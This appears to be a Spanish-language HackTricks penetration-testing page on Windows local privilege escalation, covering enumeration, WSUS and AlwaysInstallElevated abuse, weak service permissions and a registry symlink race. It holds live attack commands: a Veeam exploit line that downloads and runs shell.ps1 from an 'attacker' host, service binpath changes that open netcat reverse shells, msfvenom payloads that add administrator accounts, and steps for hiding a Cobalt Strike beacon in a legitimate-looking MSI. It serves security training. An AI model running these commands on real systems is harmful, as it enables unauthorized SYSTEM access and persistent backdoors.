# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Mejor herramienta para buscar Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoría inicial de Windows

### Access Tokens

**Si no sabes qué son los Windows Access Tokens, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la siguiente página para más información sobre ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si no sabes qué son los integrity levels en Windows deberías leer la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Hay diferentes cosas en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** de **defensa** antes de comenzar la enumeración de privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Los procesos UIAccess iniciados a través de `RAiLaunchAdminProcess` pueden ser abusados para alcanzar High IL sin prompts cuando las comprobaciones secure-path de AppInfo son bypassed. Revisa el flujo de trabajo dedicado de bypass de UIAccess/Admin Protection aquí:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (revisa también los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits por versión

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre las vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene más de 4,700 vulnerabilidades de seguridad, mostrando la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Alguna credencial/Juicy info guardada en las variables de entorno?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender cómo habilitar esto en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Se registran detalles de las ejecuciones del pipeline de PowerShell, abarcando los comandos ejecutados, las invocaciones de comandos y partes de scripts. Sin embargo, no siempre se capturan los detalles completos de la ejecución ni los resultados de salida.

Para habilitar esto, sigue las instrucciones en la sección "Transcript files" de la documentación, optando por **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los registros de PowersShell puedes ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y del contenido del script durante su ejecución, asegurando que cada bloque de código quede documentado a medida que se ejecuta. Este proceso preserva una pista de auditoría exhaustiva de cada actividad, valiosa para forensics y para el análisis de comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se obtienen detalles profundos sobre el proceso.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de registro para el Script Block se pueden localizar en el Windows Event Viewer en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver los últimos 20 eventos puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan usando http**S** sino http.

Empieza comprobando si la red utiliza una actualización WSUS sin SSL ejecutando lo siguiente en cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
O lo siguiente en PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si recibes una respuesta como alguna de estas:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Entonces, **es explotable.** Si la última clave del registro es igual a `0`, la entrada WSUS será ignorada.

Para explotar estas vulnerabilidades puedes usar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Estos son scripts de exploit MiTM armados para inyectar actualizaciones 'falsas' en tráfico WSUS sin SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Básicamente, este es el fallo que explota este bug:

> Si tenemos la capacidad de modificar el proxy del usuario local, y Windows Updates usa el proxy configurado en los ajustes de Internet Explorer, por lo tanto tenemos la capacidad de ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario elevado en nuestro equipo.
>
> Además, dado que el servicio WSUS usa la configuración del usuario actual, también usará su almacén de certificados. Si generamos un certificado autofirmado para el hostname de WSUS y añadimos este certificado al almacén de certificados del usuario actual, podremos interceptar tanto el tráfico HTTP como HTTPS de WSUS. WSUS no usa mecanismos tipo HSTS para implementar una validación trust-on-first-use sobre el certificado. Si el certificado presentado es confiable para el usuario y tiene el hostname correcto, será aceptado por el servicio.

Puedes explotar esta vulnerabilidad usando la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una vez que esté liberada).

## Actualizadores automáticos de terceros e IPC del agente (local privesc)

Muchos agentes empresariales exponen una superficie IPC en localhost y un canal de actualización privilegiado. Si la inscripción puede ser coaccionada hacia un servidor atacante y el actualizador confía en una CA raíz maliciosa o en comprobaciones de firma débiles, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Ve una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309) aquí:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expone un servicio en localhost en **TCP/9401** que procesa mensajes controlados por el atacante, permitiendo comandos arbitrarios como **NT AUTHORITY\SYSTEM**.

- **Recon**: confirma el listener y la versión, p. ej., `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: coloca un PoC como `VeeamHax.exe` con las DLLs de Veeam requeridas en el mismo directorio, luego desencadena una payload SYSTEM sobre el socket local:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
El servicio ejecuta el comando como SYSTEM.
## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Encuentra el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para más información sobre el flujo del ataque consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** estas 2 entradas del registro están **habilitadas** (valor es **0x1**), entonces usuarios de cualquier privilegio pueden **install** (ejecutar) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si tienes una sesión meterpreter, puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear, dentro del directorio actual, un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita la adición de un usuario/grupo (por lo que necesitarás acceso GIU):
```
Write-UserAddMSI
```
Simplemente ejecuta el binario creado para escalar privilegios.

### Wrapper de MSI

Lee este tutorial para aprender cómo crear un MSI wrapper usando estas herramientas. Ten en cuenta que puedes envolver un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comando**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Crear MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Crear MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **new Windows EXE TCP payload** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Dale al proyecto un nombre, como **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory**, y haz clic en **Create**.
- Sigue haciendo clic en **Next** hasta que llegues al paso 3 de 4 (elige archivos para incluir). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Luego haz clic en **Finish**.
- Resalta el proyecto **AlwaysPrivesc** en el **Solution Explorer** y en las **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
- Hay otras propiedades que puedes cambiar, como **Author** y **Manufacturer**, lo que puede hacer que la aplicación instalada parezca más legítima.
- Haz clic derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona tu archivo **beacon.exe** y haz clic en **OK**. Esto asegurará que el payload beacon se ejecute tan pronto como se ejecute el instalador.
- Bajo las **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Finalmente, **compílalo**.
- Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de haber establecido la plataforma en x64.

### MSI Installation

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Ajustes de auditoría

Estos ajustes determinan qué se está **registrando**, por lo que debes prestar atención
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es interesante saber a dónde se envían los logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas locales del Administrador**, asegurando que cada contraseña sea **única, aleatorizada y actualizada regularmente** en equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden ser accedidas por usuarios a quienes se les hayan otorgado permisos suficientes mediante ACLs, permitiéndoles ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de seguridad local (LSA) para **bloquear** intentos de procesos no confiables de **leer su memoria** o inyectar código, asegurando aún más el sistema.\
[**Más información sobre LSA Protection aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** fue introducido en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo contra amenazas como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** son autenticadas por la **Local Security Authority** (LSA) y son utilizadas por los componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, por lo general se establecen domain credentials para el usuario.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios & Grupos

### Enumerar Usuarios & Grupos

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Aprende sobre grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones
```bash
qwinsta
klist sessions
```
### Carpetas de inicio
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```bash
net accounts
```
### Obtener el contenido del portapapeles
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

Primero, al listar los procesos, comprueba si hay passwords dentro de la command line del proceso.\
Comprueba si puedes **overwrite some binary running** o si tienes permisos de escritura en la carpeta del binary para explotar posibles [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Siempre comprueba si hay posibles [**electron/cef/chromium debuggers** ejecutándose; podrías abusar de ellos para escalar privilegios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Comprobando permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Comprobando permisos de las carpetas de los binaries de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Minería de contraseñas en memoria

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump** de sysinternals. Servicios como FTP tienen las **credentials in clear text in memory**, intenta volcar la memoria y leer las credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir a un usuario abrir un CMD o explorar directorios.**

Ejemplo: "Windows Help and Support" (Windows + F1), busca "command prompt", haz clic en "Click to open Command Prompt"

## Servicios

Service Triggers permiten que Windows inicie un servicio cuando se producen ciertas condiciones (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Incluso sin los permisos SERVICE_START, a menudo puedes iniciar servicios privilegiados activando sus triggers. Ver técnicas de enumeración y activación aquí:

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtén una lista de servicios:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información de un servicio
```bash
sc qc <service_name>
```
Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegio requerido para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda comprobar si "Authenticated Users" pueden modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puedes descargar accesschk.exe para XP desde aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar servicio

Si tienes este error (por ejemplo con SSDPSRV):

_Se ha producido el error del sistema 1058._\
_El servicio no se puede iniciar, bien porque está deshabilitado o porque no tiene dispositivos habilitados asociados._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa a este problema es ejecutar:**
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

En el escenario en que el grupo "Authenticated users" posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificar y ejecutar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servicio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Los privilegios pueden escalarse a través de varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Habilita la reconfiguración de permisos, lo que conlleva la capacidad de cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar las configuraciones del servicio.

Para la detección y explotación de esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Comprueba si puedes modificar el binario que es ejecutado por un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios que son ejecutados por un servicio usando **wmic** (no en system32) y comprobar tus permisos usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** y **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permisos para modificar el registro de servicios

Deberías comprobar si puedes modificar algún registro de servicios.\
Puedes **comprobar** tus **permisos** sobre un **registro** de servicios haciendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Se debe comprobar si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. Si es así, el binario ejecutado por el servicio puede ser alterado.

Para cambiar la Path del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista las funciones de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena la configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante el inicio de sesión/transiciones de secure-desktop y es escribible por el usuario.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Rellena el valor **HKCU ATConfig** que quieres que SYSTEM escriba.
2. Provoca la copia al secure-desktop (p. ej., **LockWorkstation**), que inicia el flujo del AT broker.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando el oplock se dispare, reemplaza la clave **HKLM Session ATConfig** por un **registry link** a un objetivo HKLM protegido.
4. SYSTEM escribe el valor elegido por el atacante en la ruta HKLM redirigida.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/línea de comandos)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (p. ej., **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la estación de trabajo** como parte de la carrera.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permisos AppendData/AddSubdirectory en el registro de servicios

Si tienes este permiso sobre una clave del registro, esto significa que **puedes crear subclaves a partir de esta**. En el caso de servicios de Windows esto es **suficiente para ejecutar código arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Rutas de servicio sin comillas

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada parte que termine antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Enumera todas las rutas de servicio sin comillas, excluyendo las que pertenecen a los servicios integrados de Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Acciones de recuperación

Windows permite a los usuarios especificar acciones que se ejecutarán si un servicio falla. Esta feature puede configurarse para apuntar a un binary. Si este binary es reemplazable, podría ser posible privilege escalation. Más detalles se pueden encontrar en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permissions of the binaries** (quizá puedas overwrite alguno y escalate privileges) y de las **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer algún archivo especial o si puedes modificar algún binario que vaya a ser ejecutado por una cuenta de Administrador (schedtasks).

